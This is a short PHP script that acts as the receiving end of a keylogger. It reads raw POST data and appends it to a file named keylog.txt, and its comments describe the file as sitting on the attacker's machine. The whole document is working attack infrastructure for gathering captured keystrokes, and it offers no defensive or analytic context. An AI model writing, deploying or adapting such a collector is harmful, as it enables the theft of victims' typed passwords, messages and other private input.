<?php
$data = file_get_contents("php://input"); // Reads raw POST data sent to this PHP file
file_put_contents("keylog.txt", $data, FILE_APPEND); // Saves (appends) incoming data to a file on the attackers machine
?>
